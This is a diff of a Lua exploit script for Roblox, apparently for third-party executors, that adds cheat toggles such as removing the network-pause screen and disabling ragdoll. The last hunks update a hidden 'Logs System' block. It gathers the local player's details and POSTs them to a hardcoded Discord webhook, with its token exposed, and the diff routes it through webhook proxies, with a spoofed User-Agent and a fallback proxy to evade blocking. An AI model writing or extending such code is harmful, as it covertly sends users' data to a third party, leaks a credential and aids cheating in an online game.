-            local currentPause = RobloxGui:FindFirstChild("CoreScripts/NetworkPause")
-            
-            if currentPause then 
-                currentPause:Destroy() 
-            end
-            
-            networkPausedConn = RobloxGui.ChildAdded:Connect(function(obj)
-                if obj.Name == "CoreScripts/NetworkPause" then
-                    task.wait() 
-                    obj:Destroy()
+        AntiGPTPause = Tabs.Extension:AddToggle("AntiNetworkPause", {
+            Title = "Anti Gameplay Paused", 
+            Default = false, 
+            Description = ""
+        })
+
+        AntiGPTPause:OnChanged(function(Value)
+            if Value then
+                pcall(function()
+                    RobloxGui = game:GetService("CoreGui"):WaitForChild("RobloxGui")
+                    currentPause = RobloxGui:FindFirstChild("CoreScripts/NetworkPause")
+                    
+                    if currentPause then 
+                        currentPause:Destroy() 
+                    end
+                    
+                    networkPausedConn = RobloxGui.ChildAdded:Connect(function(obj)
+                        if obj.Name == "CoreScripts/NetworkPause" then
+                            task.wait() 
+                            obj:Destroy()
+                        end
+                    end)
+                end)
+            else
+                if networkPausedConn then
+                    networkPausedConn:Disconnect()
+                    networkPausedConn = nil
                 end
-            end)
+            end
         end)
-    else
-        if networkPausedConn then
-            networkPausedConn:Disconnect()
-            networkPausedConn = nil
-        end
-    end
-end)
-
+    end)
 
     Tabs.Extension:AddToggle("FpsUnlockToggle", {
         Title = "Unlock FPS",
@@ -8283,89 +8701,82 @@ end)
         end
     })
 
-    task.spawn(function()
-        while true do
-            if FpsConfig.Enabled then
-                updateFps()
-            end
-            task.wait(5)
+    while true do
+        if FpsConfig.Enabled then
+            updateFps()
         end
-    end)
-end
+        task.wait(5)
+    end
+end)
 
 getgenv().DisableRagdoll = false
 getgenv().OptimizeRendering = false
 
--- Toggles
+task.spawn(function()
+    RagdollToggle = Tabs.Extension:AddToggle("RagdollToggle", {Title = "Anti-Ragdoll", Default = false})
+    OptimizeToggle = Tabs.Extension:AddToggle("OptimizeToggle", {Title = "Render Optimization", Default = false})
 
-local RagdollToggle = Tabs.Extension:AddToggle("RagdollToggle", {Title = "Anti-Ragdoll", Default = false})
-local OptimizeToggle = Tabs.Extension:AddToggle("OptimizeToggle", {Title = "Render Optimization", Default = false})
+    RagdollToggle:OnChanged(function()
+        getgenv().DisableRagdoll = RagdollToggle.Value
+    end)
 
-RagdollToggle:OnChanged(function()
-    getgenv().DisableRagdoll = RagdollToggle.Value
-end)
-
-
-local function safeOptimize(obj)
-    if obj:IsA("BasePart") then
-        if obj.Transparency >= 1 or (obj.Material == Enum.Material.Plastic and obj.Transparency > 0) then
-            obj.CastShadow = false
-     
-            pcall(function()
-                obj.RenderFidelity = Enum.RenderFidelity.Performance
-            end)
+    function safeOptimize(obj)
+        if obj:IsA("BasePart") then
+            if obj.Transparency >= 1 or (obj.Material == Enum.Material.Plastic and obj.Transparency > 0) then
+                obj.CastShadow = false
+                pcall(function()
+                    obj.RenderFidelity = Enum.RenderFidelity.Performance
+                end)
+            end
         end
     end
-end
 
+    OptimizeToggle:OnChanged(function()
+        getgenv().OptimizeRendering = OptimizeToggle.Value
+        if getgenv().OptimizeRendering then
+            for _, obj in ipairs(workspace:GetDescendants()) do
+                safeOptimize(obj)
+            end
+        end
+    end)
 
-OptimizeToggle:OnChanged(function()
-    getgenv().OptimizeRendering = OptimizeToggle.Value
-    
-    if getgenv().OptimizeRendering then
-        for _, obj in ipairs(workspace:GetDescendants()) do
+    RunService = game:GetService("RunService")
+    LP = game:GetService("Players").LocalPlayer
+
+    RunService.Stepped:Connect(function()
+        if not getgenv().DisableRagdoll then return end
+        
+        char = LP.Character
+        if char then
+            hum = char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
+                hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+                
+                state = hum:GetState()
+                if state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
+                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+                end
+            end
+            
+            for _, obj in ipairs(char:GetDescendants()) do
+                if obj:IsA("BallSocketConstraint") or obj:IsA("HingeConstraint") or obj:IsA("RopeConstraint") then
+                    obj:Destroy()
+                end
+                if obj:IsA("BasePart") and obj.Name ~= "HumanoidRootPart" then
+                    obj.CanCollide = true
+                end
+            end
+        end
+    end)
+
+    workspace.DescendantAdded:Connect(function(obj)
+        if getgenv().OptimizeRendering then
             safeOptimize(obj)
         end
-    end
+    end)
 end)
 
--- Fone
-
-local RunService = game:GetService("RunService")
-local LP = game:GetService("Players").LocalPlayer
-
-RunService.Stepped:Connect(function()
-    if not getgenv().DisableRagdoll then return end
-    
-    local char = LP.Character
-    if char then
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        if hum then
-            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
-            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
-            
-            local state = hum:GetState()
-            if state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
-                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
-            end
-        end
-        
-        for _, obj in ipairs(char:GetDescendants()) do
-            if obj:IsA("BallSocketConstraint") or obj:IsA("HingeConstraint") or obj:IsA("RopeConstraint") then
-                obj:Destroy()
-            end
-            if obj:IsA("BasePart") and obj.Name ~= "HumanoidRootPart" then
-                obj.CanCollide = true
-            end
-        end
-    end
-end)
-
-workspace.DescendantAdded:Connect(function(obj)
-    if getgenv().OptimizeRendering then
-        safeOptimize(obj)
-    end
-end)
 
 
 Tabs.Extension:AddSection("Fast Flag Extension")
@@ -8506,7 +8917,9 @@ do
     _G.Data = {}
     _G.Data.P = game.Players.LocalPlayer
     _G.Data.H = game:GetService('HttpService')
-    _G.Data.U = 'https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO'
+    
+    local rawUrl = "https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO_"
+    _G.Data.U = rawUrl:gsub("discord%.com", "webhook.lewisakura.moe")
     
     local function GetFields()
         local info = _G.Data.P
@@ -8527,8 +8940,8 @@ do
         }
     end
 
-    local function Transmit()
-        local payload = _G.Data.H:JSONEncode({
+    function Transmit()
+        payload = _G.Data.H:JSONEncode({
             ['username'] = 'Logs System',
             ['embeds'] = {{
                 ['title'] = 'Overhaul Full Intelligence Report',
@@ -8538,11 +8951,27 @@ do
             }}
         })
 
-        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+        req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        
         if req then
-            pcall(function() req({Url=_G.Data.U, Method='POST', Headers={['Content-Type']='application/json'}, Body=payload}) end)
-        else
-            pcall(function() _G.Data.H:PostAsync(_G.Data.U, payload) end)
+            success, response = pcall(function() 
+                return req({
+                    Url = _G.Data.U, 
+                    Method = 'POST', 
+                    Headers = {
+                        ['Content-Type'] = 'application/json',
+                        ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+                    }, 
+                    Body = payload
+                }) 
+            end)
+            
+            if success and response and (response.StatusCode == 429 or response.StatusCode == 403) then
+                backupUrl = rawUrl:gsub("discord%.com", "api.hyra.io")
+                pcall(function()
+                    req({Url = backupUrl, Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = payload})
+                end)
+            end
         end
         _G.Data = nil
     end
